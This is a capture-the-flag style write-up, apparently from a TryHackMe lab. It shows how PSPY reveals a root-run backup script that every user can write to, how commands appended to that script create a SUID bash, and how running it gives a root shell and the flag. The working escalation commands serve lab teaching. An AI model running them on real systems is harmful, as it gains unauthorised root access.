# Privilege Escalation via Writable Root Cron Script (PSPY)

## Overview

When traditional enumeration does not reveal obvious privilege escalation vectors, monitoring processes can uncover scheduled tasks running as **root**. A useful tool for this is **PSPY**, which allows process monitoring without requiring root privileges.

In this scenario, PSPY revealed a root-owned script that executed every few seconds and was writable by all users.

---

## 1. Monitor Running Processes with PSPY

Transfer and execute PSPY on the target:

```bash
chmod +x pspy64
./pspy64
```

PSPY output revealed a recurring root process:

```text
UID=0 | /bin/bash /var/local/syslog-backup.sh
UID=0 | tar -czf /var/backup/syslog.tar.gz /var/log/syslog
UID=0 | sleep 10
```

This indicates that the script `/var/local/syslog-backup.sh` is being executed repeatedly by root.

---

## 2. Investigate the Script Location

Check the permissions of the directory and script:

```bash
ls -la /var/local
```

Output:

```text
drwxrwsr-x  2 root staff 4096 Jan 20 2026 .
-rwxrwxrwx  1 root staff   68 Jun 28 09:10 syslog-backup.sh
```

The critical finding is:

```text
-rwxrwxrwx
```

Meaning the script is **world-writable**, allowing any user to modify code that will later be executed by root.

---

## 3. Review the Script

View the contents:

```bash
cat /var/local/syslog-backup.sh
```

```bash
#!/bin/bash

tar -czf "/var/backup/syslog.tar.gz" "/var/log/syslog"
```

The script simply creates a backup of the syslog file.

Because it runs as root and is writable, arbitrary commands can be added.

---

## 4. Inject a Privilege Escalation Payload

Append commands that create a SUID version of Bash:

```bash
echo -e "cp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash" >> /var/local/syslog-backup.sh
```

Modified script:

```bash
#!/bin/bash

tar -czf "/var/backup/syslog.tar.gz" "/var/log/syslog"

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

---

## 5. Wait for Root to Execute the Script

Since the script runs automatically every few seconds, wait for the scheduled task to execute.

Verify the SUID Bash was created:

```bash
ls -la /tmp/rootbash
```

Expected result:

```text
-rwsr-sr-x 1 root root ...
```

The **s** in the permissions indicates the SUID bit is set.

---

## 6. Spawn a Root Shell

Execute Bash while preserving privileges:

```bash
/tmp/rootbash -p
```

Verify access:

```bash
whoami
id
```

Example:

```text
uid=0(root) gid=0(root)
```

Retrieve the flag:

```bash
cat /root/flag.txt
```

```text
THM{getting-root-with-pspy}
```

---

## Key Indicators

During enumeration, always look for:

* Scheduled tasks running as root.
* Scripts executed by cron jobs or custom automation.
* Writable files owned by root.
* Writable directories containing executable scripts.
* Repeated commands observed through PSPY.

Useful commands:

```bash
./pspy64
ls -la /var/local
find / -writable 2>/dev/null
```

---

## Key Takeaway

PSPY is extremely useful for discovering privilege escalation paths that are not visible through standard enumeration. If a process running as root repeatedly executes a script and that script is writable by a low-privileged user, arbitrary commands can be injected and executed with root privileges. Always investigate recurring root processes and verify permissions on any scripts they execute.
